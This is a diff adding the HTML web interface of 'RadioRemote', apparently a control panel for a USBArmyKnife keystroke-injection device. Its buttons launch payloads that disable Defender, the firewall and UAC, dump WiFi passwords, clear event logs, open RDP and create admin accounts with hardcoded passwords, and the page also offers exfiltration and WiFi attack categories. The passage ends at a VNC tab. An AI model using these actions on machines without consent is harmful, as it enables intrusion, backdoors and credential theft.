@@ -1,0 +1,1106 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>RadioRemote | G4MEOVER</title>
+<style>
+:root{
+  --bg:#060a06;--bg2:#0d150d;--bg3:#111d11;
+  --green:#00ff41;--teal:#00d4aa;--dim:#00a028;
+  --card:rgba(0,20,0,.85);--border:rgba(0,255,65,.25);
+  --text:#c8ffc8;--muted:#4a7a4a;--danger:#ff4141;--warn:#ffaa00;
+  --radius:8px;--transition:all .2s ease;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{height:100%}
+body{font-family:'Courier New',Courier,monospace;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden}
+body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,.012) 2px,rgba(0,255,65,.012) 4px);pointer-events:none;z-index:9999}
+body::after{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(0,255,65,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,65,.03) 1px,transparent 1px);background-size:40px 40px;pointer-events:none;z-index:0}
+.header{position:sticky;top:0;z-index:100;background:rgba(6,10,6,.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);padding:12px 20px;display:flex;align-items:center;justify-content:space-between;gap:12px}
+.brand{display:flex;align-items:center;gap:14px}
+.logo-text{font-size:22px;font-weight:900;letter-spacing:2px;color:var(--green);text-shadow:0 0 20px var(--green),0 0 40px rgba(0,255,65,.4)}
+.logo-text span{color:var(--teal)}
+.tagline{font-size:10px;color:var(--muted);letter-spacing:3px;text-transform:uppercase;margin-top:2px}
+.header-right{display:flex;align-items:center;gap:12px}
+.status-dot{width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 8px var(--green);animation:pulse-dot 2s infinite}
+.status-dot.offline{background:var(--danger);box-shadow:0 0 8px var(--danger);animation:none}
+@keyframes pulse-dot{0%,100%{opacity:1}50%{opacity:.4}}
+.version-badge{font-size:9px;color:var(--muted);letter-spacing:1px;padding:3px 8px;border:1px solid var(--border);border-radius:3px}
+.nav-bar{background:var(--bg2);border-bottom:1px solid var(--border);display:flex;overflow-x:auto;scrollbar-width:none;position:sticky;top:57px;z-index:99}
+.nav-bar::-webkit-scrollbar{display:none}
+.nav-tab{padding:12px 20px;font-size:11px;letter-spacing:2px;text-transform:uppercase;color:var(--muted);cursor:pointer;white-space:nowrap;border-bottom:2px solid transparent;transition:var(--transition);user-select:none}
+.nav-tab:hover{color:var(--text);background:rgba(0,255,65,.05)}
+.nav-tab.active{color:var(--green);border-bottom-color:var(--green);text-shadow:0 0 10px rgba(0,255,65,.5)}
+.content{position:relative;z-index:1;padding:20px;max-width:1400px;margin:0 auto}
+.tab-panel{display:none}
+.tab-panel.active{display:block}
+.card{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:20px;margin-bottom:16px;transition:var(--transition)}
+.card:hover{border-color:rgba(0,255,65,.4);box-shadow:0 0 20px rgba(0,255,65,.07)}
+.card-title{font-size:11px;letter-spacing:3px;text-transform:uppercase;color:var(--teal);margin-bottom:14px;display:flex;align-items:center;gap:8px}
+.card-title::before{content:'▸';color:var(--green)}
+.grid-2{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:16px}
+.grid-4{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:12px}
+.stat-card{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:16px;text-align:center;transition:var(--transition)}
+.stat-card:hover{border-color:rgba(0,255,65,.45);box-shadow:0 0 16px rgba(0,255,65,.1)}
+.stat-value{font-size:28px;font-weight:700;color:var(--green);text-shadow:0 0 15px rgba(0,255,65,.5);line-height:1}
+.stat-label{font-size:9px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-top:6px}
+.progress-wrap{background:rgba(0,255,65,.1);border-radius:3px;overflow:hidden;height:4px;margin-top:8px}
+.progress-bar{height:100%;background:var(--green);box-shadow:0 0 8px var(--green);transition:width .5s ease;border-radius:3px}
+.progress-bar.warn{background:var(--warn);box-shadow:0 0 8px var(--warn)}
+.progress-bar.danger{background:var(--danger);box-shadow:0 0 8px var(--danger)}
+.btn{display:inline-flex;align-items:center;gap:6px;padding:8px 16px;border:1px solid var(--border);border-radius:4px;background:transparent;color:var(--text);font-family:inherit;font-size:11px;letter-spacing:1px;cursor:pointer;transition:var(--transition);text-decoration:none}
+.btn:hover{border-color:var(--green);color:var(--green);box-shadow:0 0 10px rgba(0,255,65,.2)}
+.btn-primary{background:rgba(0,255,65,.15);border-color:var(--green);color:var(--green)}
+.btn-primary:hover{background:rgba(0,255,65,.3);box-shadow:0 0 20px rgba(0,255,65,.3)}
+.btn-danger{border-color:var(--danger);color:var(--danger)}
+.btn-danger:hover{background:rgba(255,65,65,.15)}
+.btn-warn{border-color:var(--warn);color:var(--warn)}
+.btn-sm{padding:5px 10px;font-size:10px}
+.btn-xs{padding:3px 8px;font-size:9px}
+.btn:disabled{opacity:.35;cursor:not-allowed;pointer-events:none}
+.badge{display:inline-block;padding:2px 8px;border-radius:3px;font-size:9px;letter-spacing:1px;text-transform:uppercase;font-weight:700}
+.badge-wifi{background:rgba(0,212,170,.2);color:var(--teal);border:1px solid rgba(0,212,170,.4)}
+.badge-ble{background:rgba(100,50,200,.2);color:#a06aff;border:1px solid rgba(100,50,200,.4)}
+.badge-hid{background:rgba(255,170,0,.2);color:var(--warn);border:1px solid rgba(255,170,0,.4)}
+.badge-exfil{background:rgba(255,65,65,.2);color:var(--danger);border:1px solid rgba(255,65,65,.4)}
+.badge-recon{background:rgba(0,100,255,.2);color:#4a9eff;border:1px solid rgba(0,100,255,.4)}
+.badge-fun{background:rgba(255,65,200,.2);color:#ff65c8;border:1px solid rgba(255,65,200,.4)}
+.badge-usb{background:rgba(255,200,0,.2);color:#ffcc00;border:1px solid rgba(255,200,0,.4)}
+.badge-misc,.badge-USB_HID,.badge-SD,.badge-WIFI,.badge-TFT,.badge-BUTTON,.badge-LED,.badge-MIC,.badge-MARAUDER{background:rgba(0,255,65,.1);color:var(--green);border:1px solid rgba(0,255,65,.3)}
+.payload-card{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:14px;display:flex;flex-direction:column;gap:8px;transition:var(--transition)}
+.payload-card:hover{border-color:rgba(0,255,65,.4);box-shadow:0 0 16px rgba(0,255,65,.08)}
+.payload-card.hid-disabled{opacity:.45;border-color:rgba(255,170,0,.2)}
+.payload-name{font-size:12px;color:var(--green);font-weight:700;word-break:break-all}
+.payload-desc{font-size:11px;color:var(--text);opacity:.8;flex:1;line-height:1.5}
+.payload-footer{display:flex;align-items:center;justify-content:space-between;gap:6px}
+.filter-wrap{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:14px;align-items:center}
+.filter-btn{padding:4px 12px;border:1px solid var(--border);border-radius:3px;background:transparent;color:var(--muted);font-family:inherit;font-size:10px;letter-spacing:1px;cursor:pointer;transition:var(--transition)}
+.filter-btn:hover,.filter-btn.active{border-color:var(--green);color:var(--green);background:rgba(0,255,65,.08)}
+.cmd-card{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:12px;transition:var(--transition)}
+.cmd-card:hover{border-color:rgba(0,255,65,.4);box-shadow:0 0 12px rgba(0,255,65,.06)}
+.cmd-name{font-size:13px;color:var(--green);font-weight:700;margin-bottom:4px}
+.cmd-desc{font-size:11px;color:var(--text);opacity:.8;margin-bottom:8px;line-height:1.4}
+.cmd-params{font-size:10px;color:var(--teal);font-family:'Courier New',monospace;margin-bottom:8px;opacity:.8}
+.cmd-footer{display:flex;align-items:center;justify-content:space-between;gap:6px}
+.cat-badge{font-size:9px;padding:2px 8px;border-radius:3px;letter-spacing:1px;text-transform:uppercase}
+.cat-WiFi{background:rgba(0,212,170,.15);color:var(--teal);border:1px solid rgba(0,212,170,.3)}
+.cat-Attack{background:rgba(255,65,65,.15);color:var(--danger);border:1px solid rgba(255,65,65,.3)}
+.cat-BLE{background:rgba(100,50,200,.15);color:#a06aff;border:1px solid rgba(100,50,200,.3)}
+.cat-Sniff{background:rgba(0,100,255,.15);color:#4a9eff;border:1px solid rgba(0,100,255,.3)}
+.cat-Info{background:rgba(100,100,100,.15);color:var(--muted);border:1px solid rgba(100,100,100,.3)}
+.marauder-quick{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:16px;margin-bottom:16px}
+.marauder-input-row{display:flex;gap:8px}
+.marauder-input{flex:1;background:rgba(0,255,65,.05);border:1px solid var(--border);border-radius:4px;color:var(--green);font-family:'Courier New',monospace;font-size:13px;padding:10px 14px;outline:none}
+.marauder-input:focus{border-color:var(--green);box-shadow:0 0 10px rgba(0,255,65,.2)}
+.file-row{display:flex;align-items:center;gap:8px;padding:10px 0;border-bottom:1px solid rgba(0,255,65,.07)}
+.file-row:last-child{border-bottom:none}
+.file-name{flex:1;font-size:12px;color:var(--text);word-break:break-all}
+.file-ext{font-size:10px;color:var(--muted)}
+.file-actions{display:flex;gap:6px;flex-shrink:0}
+.log-wrap{background:rgba(0,10,0,.6);border:1px solid var(--border);border-radius:var(--radius);padding:14px;height:420px;overflow-y:auto;font-family:'Courier New',monospace;font-size:11px;line-height:1.6}
+.log-wrap::-webkit-scrollbar{width:4px}
+.log-wrap::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
+.log-entry{color:var(--text);opacity:.85;padding:1px 0;border-bottom:1px solid rgba(0,255,65,.04)}
+.setting-row{display:flex;align-items:center;gap:12px;padding:10px 0;border-bottom:1px solid rgba(0,255,65,.07)}
+.setting-row:last-child{border-bottom:none}
+.setting-name{flex:1;font-size:12px;color:var(--text)}
+.setting-input{background:rgba(0,255,65,.05);border:1px solid var(--border);border-radius:4px;color:var(--text);font-family:inherit;font-size:12px;padding:6px 10px;outline:none;min-width:130px}
+.setting-input:focus{border-color:var(--green);box-shadow:0 0 8px rgba(0,255,65,.15)}
+.setting-input[type=checkbox]{width:18px;height:18px;accent-color:var(--green);min-width:unset}
+#toast-container{position:fixed;bottom:24px;right:24px;z-index:10000;display:flex;flex-direction:column;gap:8px;pointer-events:none}
+.toast{background:rgba(6,10,6,.96);border:1px solid var(--border);border-radius:var(--radius);padding:12px 18px;font-size:12px;color:var(--text);display:flex;align-items:center;gap:10px;box-shadow:0 4px 24px rgba(0,0,0,.6);pointer-events:all;animation:toast-in .3s ease;min-width:220px;max-width:340px}
+.toast.success{border-color:var(--green);color:var(--green)}
+.toast.error{border-color:var(--danger);color:var(--danger)}
+.toast.warn{border-color:var(--warn);color:var(--warn)}
+@keyframes toast-in{from{opacity:0;transform:translateX(30px)}to{opacity:1;transform:translateX(0)}}
+.running-indicator{display:none;align-items:center;gap:8px;padding:10px 14px;background:rgba(0,255,65,.07);border:1px solid var(--green);border-radius:4px;font-size:11px;color:var(--green);margin-bottom:12px;animation:glow-pulse 2s infinite}
+.running-indicator.visible{display:flex}
+@keyframes glow-pulse{0%,100%{box-shadow:0 0 8px rgba(0,255,65,.2)}50%{box-shadow:0 0 20px rgba(0,255,65,.5)}}
+.spinner{display:inline-block;width:12px;height:12px;border:2px solid var(--border);border-top-color:var(--green);border-radius:50%;animation:spin .8s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.hid-warning{display:flex;align-items:center;gap:8px;padding:10px 14px;background:rgba(255,170,0,.07);border:1px solid rgba(255,170,0,.3);border-radius:4px;font-size:11px;color:var(--warn);margin-bottom:12px}
+.search-box{width:100%;background:rgba(0,255,65,.05);border:1px solid var(--border);border-radius:4px;color:var(--text);font-family:inherit;font-size:12px;padding:8px 12px;outline:none;margin-bottom:14px}
+.search-box:focus{border-color:var(--green);box-shadow:0 0 8px rgba(0,255,65,.12)}
+.empty{text-align:center;padding:40px;color:var(--muted);font-size:12px;letter-spacing:1px}
+.divider{border:none;border-top:1px solid var(--border);margin:14px 0}
+.info-row{display:flex;align-items:center;gap:8px;padding:8px 0;border-bottom:1px solid rgba(0,255,65,.07);font-size:12px}
+.info-row:last-child{border-bottom:none}
+.info-key{color:var(--muted);letter-spacing:1px;min-width:100px}
+.info-val{color:var(--green)}
+@media(max-width:600px){.content{padding:10px}.grid-2,.grid-4{grid-template-columns:1fr}.header{padding:10px 14px}}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="brand">
+    <div>
+      <div class="logo-text">G4<span>MEOVER</span> <span style="font-size:13px;opacity:.5;margin:0 6px">&#9646;</span>RadioRemote</div>
+      <div class="tagline">by Yanis Ameseder &nbsp;&#xB7;&nbsp; USBArmyKnife</div>
+    </div>
+  </div>
+  <div class="header-right">
+    <div class="version-badge" id="v-badge">v---</div>
+    <div class="status-dot offline" id="s-dot"></div>
+  </div>
+</div>
+
+<div class="nav-bar" id="nav-bar">
+  <div class="nav-tab active" onclick="showTab('status',this)">&#x2B21; Status</div>
+  <div class="nav-tab" onclick="showTab('pcsupport',this)">&#x1F4BB; PC-Support</div>
+  <div class="nav-tab" onclick="showTab('fernwartung',this)">&#x1F5A5; Remote</div>
+  <div class="nav-tab" onclick="showTab('vnc',this)">&#x1F4F9; VNC</div>
+  <div class="nav-tab" onclick="showTab('diagnose',this)">&#x1F4CA; Diagnose</div>
+  <div class="nav-tab" onclick="showTab('medicat',this)">&#x1F4BF; MediCat</div>
+  <div class="nav-tab" onclick="showTab('reparatur',this)">&#x1F527; Repair</div>
+  <div class="nav-tab" onclick="showTab('sicherheit',this)">&#x1F6E1; Security</div>
+  <div class="nav-tab" onclick="showTab('payloads',this)">&#x26A1; Payloads</div>
+  <div class="nav-tab" onclick="showTab('files',this)">&#x1F4C1; Files</div>
+  <div class="nav-tab" onclick="showTab('logs',this)">&#x1F4CB; Logs</div>
+  <div class="nav-tab" onclick="showTab('marauder',this)">&#x1F4E1; Marauder</div>
+  <div class="nav-tab" onclick="showTab('update',this)">&#x1F504; Update</div>
+  <div class="nav-tab" onclick="showTab('settings',this)">&#x2699; Settings</div>
+</div>
+
+<div class="content">
+
+  <!-- STATUS -->
+  <div class="tab-panel active" id="tab-status">
+    <div class="running-indicator" id="run-ind">
+      <div class="spinner"></div>&nbsp;Payload running&hellip;&nbsp;<span id="run-errs"></span>
+    </div>
+    <div class="grid-4" style="margin-bottom:18px">
+      <div class="stat-card"><div class="stat-value" id="s-heap">--</div><div class="stat-label">Free Heap</div><div class="progress-wrap"><div class="progress-bar" id="heap-bar" style="width:0%"></div></div></div>
+      <div class="stat-card"><div class="stat-value" id="s-sd">--</div><div class="stat-label">SD Used %</div><div class="progress-wrap"><div class="progress-bar" id="sd-bar" style="width:0%"></div></div></div>
+      <div class="stat-card"><div class="stat-value" id="s-up">--</div><div class="stat-label">Uptime</div></div>
+      <div class="stat-card"><div class="stat-value" id="s-err">0</div><div class="stat-label">Errors</div></div>
+    </div>
+    <div class="grid-2">
+      <div class="card">
+        <div class="card-title">Device</div>
+        <div class="info-row"><div class="info-key">Chip</div><div class="info-val" id="i-chip">--</div></div>
+        <div class="info-row"><div class="info-key">Cores</div><div class="info-val" id="i-cores">--</div></div>
+        <div class="info-row"><div class="info-key">USB Mode</div><div class="info-val" id="i-usb" style="color:var(--teal)">--</div></div>
+        <div class="info-row"><div class="info-key">Agent</div><div id="i-agent">--</div></div>
+        <div class="info-row"><div class="info-key">Machine</div><div class="info-val" id="i-machine" style="color:var(--text)">--</div></div>
+      </div>
+      <div class="card">
+        <div class="card-title">Capabilities</div>
+        <div id="cap-list" style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:14px"></div>
+        <div class="divider"></div>
+        <div class="card-title">Quick Actions</div>
+        <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px">
+          <button class="btn btn-sm" onclick="clrLogs()">&#x1F5D1; Clear Logs</button>
+          <button class="btn btn-sm" onclick="refresh()">&#x21BA; Refresh</button>
+          <button class="btn btn-sm btn-danger" onclick="devReboot()">&#x1F504; Reboot</button>
+          <button class="btn btn-sm" onclick="runPL('hid_win_defender_disable_mount_sd.ds')" id="qa-defender">&#x1F6E1; Disable Defender + Mount SD</button>
+        </div>
+        <div class="card-title" style="margin-top:8px">USB Mode</div>
+        <div style="display:flex;gap:8px;flex-wrap:wrap">
+          <button class="btn btn-xs" onclick="setUsb('storage')" title="USB Mass Storage (SD card)">&#x1F4BE; Storage</button>
+          <button class="btn btn-xs" onclick="setUsb('hid')" title="USB HID Keyboard/Mouse" id="qa-hid">&#x2328; HID</button>
+          <button class="btn btn-xs" onclick="setUsb('ncm')" title="USB Ethernet (NCM)">&#x1F310; NCM</button>
+          <button class="btn btn-xs" onclick="setUsb('serial')" title="USB Serial">&#x1F50C; Serial</button>
+          <button class="btn btn-xs btn-danger" onclick="setUsb('none')" title="Disable USB">&#x274C; Off</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PAYLOADS -->
+  <div class="tab-panel" id="tab-payloads">
+    <div class="hid-warning" id="hid-warn" style="display:none">&#x26A0; HID payloads disabled &#x2014; no native USB on this device.</div>
+    <div class="running-indicator" id="run-ind-p"><div class="spinner"></div>&nbsp;Payload running&hellip;</div>
+    <input class="search-box" type="text" placeholder="&#x1F50D; Search payloads&hellip;" oninput="filterPL()" id="pl-search">
+    <div class="filter-wrap" id="cat-filter">
+      <button class="filter-btn active" data-c="all" onclick="setC('all',this)">All</button>
+      <button class="filter-btn" data-c="wifi" onclick="setC('wifi',this)">WiFi</button>
+      <button class="filter-btn" data-c="ble" onclick="setC('ble',this)">BLE</button>
+      <button class="filter-btn" data-c="hid" onclick="setC('hid',this)">HID</button>
+      <button class="filter-btn" data-c="exfil" onclick="setC('exfil',this)">Exfil</button>
+      <button class="filter-btn" data-c="recon" onclick="setC('recon',this)">Recon</button>
+      <button class="filter-btn" data-c="fun" onclick="setC('fun',this)">Fun</button>
+      <button class="filter-btn" data-c="usb" onclick="setC('usb',this)">USB</button>
+      <button class="filter-btn" data-c="misc" onclick="setC('misc',this)">Misc</button>
+    </div>
+    <div class="grid-2" id="pl-grid"><div class="empty">Loading payloads&hellip;</div></div>
+  </div>
+
+  <!-- MARAUDER -->
+  <div class="tab-panel" id="tab-marauder">
+    <div class="marauder-quick">
+      <div class="card-title">Quick Command</div>
+      <div class="marauder-input-row">
+        <input class="marauder-input" type="text" id="m-custom" placeholder="marauder command&hellip;" onkeydown="if(event.key==='Enter')runMrdr(document.getElementById('m-custom').value)">
+        <button class="btn btn-primary" onclick="runMrdr(document.getElementById('m-custom').value)">&#x25BA; Run</button>
+      </div>
+    </div>
+    <div class="filter-wrap" id="mrdr-filter">
+      <button class="filter-btn active" data-m="all" onclick="setMC('all',this)">All</button>
+      <button class="filter-btn" data-m="WiFi" onclick="setMC('WiFi',this)">WiFi</button>
+      <button class="filter-btn" data-m="Attack" onclick="setMC('Attack',this)">Attack</button>
+      <button class="filter-btn" data-m="BLE" onclick="setMC('BLE',this)">BLE</button>
+      <button class="filter-btn" data-m="Sniff" onclick="setMC('Sniff',this)">Sniff</button>
+      <button class="filter-btn" data-m="Info" onclick="setMC('Info',this)">Info</button>
+    </div>
+    <div class="grid-2" id="mrdr-grid"></div>
+  </div>
+
+  <!-- SETTINGS -->
+  <div class="tab-panel" id="tab-settings">
+    <div class="card">
+      <div class="card-title">Device Settings</div>
+      <div id="sett-body"><div class="empty">Loading&hellip;</div></div>
+    </div>
+  </div>
+
+  <!-- FILES -->
+  <div class="tab-panel" id="tab-files">
+    <div class="card">
+      <div class="card-title">SD Card Files</div>
+      <input class="search-box" type="text" placeholder="&#x1F50D; Search files&hellip;" oninput="filterF()" id="f-search">
+      <div id="f-list"><div class="empty">Loading&hellip;</div></div>
+    </div>
+  </div>
+
+  <!-- LOGS -->
+  <div class="tab-panel" id="tab-logs">
+    <div class="card">
+      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">
+        <div class="card-title" style="margin:0">System Logs</div>
+        <button class="btn btn-sm btn-danger" onclick="clrLogs()">&#x1F5D1; Clear</button>
+      </div>
+      <div class="log-wrap" id="log-out"></div>
+    </div>
+  </div>
+
+  <!-- PC SUPPORT -->
+  <div class="tab-panel" id="tab-pcsupport">
+    <div id="pcsup-hid-warn" class="hid-warning" style="display:none">&#x26A0; PC Support HID tools require USB HID mode. Switch USB mode to HID first.</div>
+    <div class="grid-2">
+
+      <div class="card">
+        <div class="card-title">System Tools</div>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <button class="btn btn-sm" onclick="pcTool('sysinfo')">&#x1F4BB; System Info (msinfo32)</button>
+          <button class="btn btn-sm" onclick="pcTool('taskmgr')">&#x1F4CA; Task Manager</button>
+          <button class="btn btn-sm" onclick="pcTool('devmgr')">&#x2699; Device Manager</button>
+          <button class="btn btn-sm" onclick="pcTool('eventvwr')">&#x1F4CB; Event Viewer</button>
+          <button class="btn btn-sm" onclick="pcTool('diskpart')">&#x1F4BE; Disk Management</button>
+          <button class="btn btn-sm" onclick="pcTool('regedit')">&#x1F511; Registry Editor</button>
+          <button class="btn btn-sm" onclick="pcTool('services')">&#x1F527; Services</button>
+          <button class="btn btn-sm btn-warn" onclick="pcTool('restart_pc')">&#x1F504; Restart PC</button>
+          <button class="btn btn-sm btn-danger" onclick="pcTool('shutdown_pc')">&#x23FB; Shutdown PC</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">Network Tools</div>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <button class="btn btn-sm" onclick="pcTool('ipconfig')">&#x1F310; ipconfig /all (to clipboard)</button>
+          <button class="btn btn-sm" onclick="pcTool('netstat')">&#x1F4E1; netstat -an (to clipboard)</button>
+          <button class="btn btn-sm" onclick="pcTool('arp')">&#x1F5A7; ARP table (to clipboard)</button>
+          <button class="btn btn-sm" onclick="pcTool('wifi_profiles')">&#x1F4F6; WiFi Profiles + Passwords</button>
+          <button class="btn btn-sm" onclick="pcTool('flush_dns')">&#x1F9F9; Flush DNS Cache</button>
+          <button class="btn btn-sm" onclick="pcTool('ncm_mode')">&#x1F50C; Switch to NCM (USB Ethernet)</button>
+          <button class="btn btn-sm" onclick="pcTool('ping_gw')">&#x1F3D3; Ping Gateway</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">Maintenance</div>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <button class="btn btn-sm" onclick="pcTool('clear_temp')">&#x1F9F9; Clear Temp Files</button>
+          <button class="btn btn-sm" onclick="pcTool('sfc')">&#x1F527; SFC /scannow (repair system)</button>
+          <button class="btn btn-sm" onclick="pcTool('dism')">&#x1F527; DISM Restore Health</button>
+          <button class="btn btn-sm" onclick="pcTool('disk_cleanup')">&#x1F5D1; Disk Cleanup</button>
+          <button class="btn btn-sm" onclick="pcTool('chkdsk')">&#x1F4BE; Schedule chkdsk C:</button>
+          <button class="btn btn-sm" onclick="pcTool('update_drivers')">&#x2B06; Windows Update (open)</button>
+          <button class="btn btn-sm" onclick="pcTool('clear_eventlog')">&#x1F4CB; Clear Event Logs</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">Security</div>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <button class="btn btn-sm btn-warn" onclick="pcTool('disable_defender')">&#x1F6E1; Disable Windows Defender</button>
+          <button class="btn btn-sm btn-warn" onclick="pcTool('disable_firewall')">&#x1F525; Disable Firewall</button>
+          <button class="btn btn-sm" onclick="pcTool('enable_defender')">&#x2705; Enable Windows Defender</button>
+          <button class="btn btn-sm" onclick="pcTool('enable_firewall')">&#x2705; Enable Firewall</button>
+          <button class="btn btn-sm" onclick="pcTool('uac_disable')">&#x26A0; Disable UAC</button>
+          <button class="btn btn-sm btn-danger" onclick="pcTool('mount_sd')">&#x1F4BE; Mount SD as USB Drive + Run start.exe</button>
+          <button class="btn btn-sm" onclick="pcTool('lock_pc')">&#x1F512; Lock PC</button>
+          <button class="btn btn-sm" onclick="pcTool('add_admin')">&#x1F464; Add Admin User (admin/admin)</button>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="card" style="margin-top:4px">
+      <div class="card-title">Custom DuckyScript via HID</div>
+      <p style="font-size:11px;color:var(--muted);margin-bottom:10px">Run raw DuckyScript commands directly over USB HID.</p>
+      <div class="marauder-input-row">
+        <input class="marauder-input" type="text" id="raw-input" placeholder="STRING Hello World" onkeydown="if(event.key==='Enter')runRawInput()">
+        <button class="btn btn-primary" onclick="runRawInput()">&#x25BA; Run</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- UPDATE -->
+  <div class="tab-panel" id="tab-update">
+    <div class="card">
+      <div class="card-title">OTA Firmware Update</div>
+      <p style="font-size:12px;color:var(--muted);margin-bottom:16px;line-height:1.8">Upload a compiled <code style="color:var(--teal)">.bin</code> file to update firmware over WiFi.</p>
+      <a class="btn btn-primary" href="/update" target="_blank">Open ElegantOTA &#x2197;</a>
+    </div>
+    <div class="card">
+      <div class="card-title">About</div>
+      <div class="info-row"><div class="info-key">Firmware</div><div class="info-val" id="ab-ver">---</div></div>
+      <div class="info-row"><div class="info-key">Author</div><div class="info-val">Yanis Ameseder</div></div>
+      <div class="info-row"><div class="info-key">Gamer Tag</div><div class="info-val" style="color:var(--green);text-shadow:0 0 10px var(--green)">G4MEOVER</div></div>
+      <div class="info-row"><div class="info-key">Platform</div><div class="info-val">USBArmyKnife</div></div>
+      <div class="info-row"><div class="info-key">Web</div><div class="info-val"><a href="https://ameseder.com" target="_blank" style="color:var(--teal);text-decoration:none">ameseder.com</a></div></div>
+    </div>
+  </div>
+
+  <!-- REMOTE ACCESS -->
+  <div class="tab-panel" id="tab-fernwartung">
+    <div id="fw-hid-warn" class="hid-warning">&#x26A0; Remote tools require USB HID mode.</div>
+    <div class="grid-2">
+      <div class="card">
+        <div class="card-title">&#x1F4BB; Remote Desktop (RDP)</div>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <button class="btn btn-sm btn-primary" onclick="pcTool('rdp_enable')">&#x2705; Enable RDP + Firewall Rule</button>
+          <button class="btn btn-sm" onclick="pcTool('rdp_user')">&#x1F464; Add current user to RDP group</button>
+          <button class="btn btn-sm btn-warn" onclick="pcTool('rdp_nla_off')">&#x26A0; Disable NLA (legacy clients)</button>
+          <button class="btn btn-sm" onclick="pcTool('rdp_password')">&#x1F511; Set support password (cf2024!)</button>
+          <button class="btn btn-sm" onclick="pcTool('rdp_port')">&#x1F50D; Check RDP status</button>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">&#x1F310; Remote Tools from SD</div>
+        <p style="font-size:10px;color:var(--muted);margin-bottom:10px">Place tools in /PortableApps/ on SD, then mount SD first.</p>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <button class="btn btn-sm btn-primary" onclick="pcTool('mount_sd_fw')">&#x1F4BE; Mount SD (USB Storage)</button>
+          <button class="btn btn-sm" onclick="pcTool('anydesk_sd')">&#x1F5A5; AnyDesk.exe from SD</button>
+          <button class="btn btn-sm" onclick="pcTool('teamviewer_sd')">&#x1F4F1; TeamViewerQS.exe from SD</button>
+          <button class="btn btn-sm" onclick="pcTool('rustdesk_sd')">&#x1F680; RustDesk.exe from SD</button>
+          <button class="btn btn-sm" onclick="pcTool('supremo_sd')">&#x1F4BB; Supremo.exe from SD</button>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">&#x1F511; SSH &amp; WinRM</div>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <button class="btn btn-sm btn-primary" onclick="pcTool('ssh_enable')">&#x2705; Enable OpenSSH Server</button>
+          <button class="btn btn-sm" onclick="pcTool('winrm_enable')">&#x2705; Enable WinRM (Remote PS)</button>
+          <button class="btn btn-sm btn-warn" onclick="pcTool('psremoting')">&#x26A0; Enable PS Remoting</button>
+          <button class="btn btn-sm" onclick="pcTool('ssh_keyscan')">&#x1F50D; SSH Fingerprint -> Clipboard</button>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">&#x1F464; Support User</div>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <button class="btn btn-sm btn-primary" onclick="pcTool('admin_create_cf')">&#x2795; Create &quot;cfrsupport&quot; / cf2024!</button>
+          <button class="btn btn-sm" onclick="pcTool('admin_create')">&#x2795; Create &quot;admin&quot; / admin</button>
+          <button class="btn btn-sm btn-warn" onclick="pcTool('autologin')">&#x1F513; Enable autologin for cfrsupport</button>
+          <button class="btn btn-sm btn-danger" onclick="pcTool('admin_remove_cf')">&#x2796; Remove &quot;cfrsupport&quot;</button>
+          <button class="btn btn-sm" onclick="pcTool('user_list')">&#x1F4CB; User list -> Clipboard</button>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">&#x1F4E1; Wake-on-LAN &amp; Network Access</div>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <button class="btn btn-sm" onclick="pcTool('wol_enable')">&#x1F4A4; Enable Wake-on-LAN</button>
+          <button class="btn btn-sm" onclick="pcTool('mac_clipboard')">&#x1F4CB; MAC Address -> Clipboard</button>
+          <button class="btn btn-sm btn-primary" onclick="setUsb('ncm')">&#x1F50C; USB Ethernet (NCM)</button>
+          <button class="btn btn-sm" onclick="pcTool('ip_info')">&#x1F310; IP Info -> Clipboard</button>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">&#x270F; Custom DuckyScript via HID</div>
+        <div class="marauder-input-row">
+          <input class="marauder-input" type="text" id="fw-raw" placeholder="STRING Hello World">
+          <button class="btn btn-primary" onclick="runRawFW()">&#x25BA; Run</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- VNC -->
+  <div class="tab-panel" id="tab-vnc">
+    <div class="card">
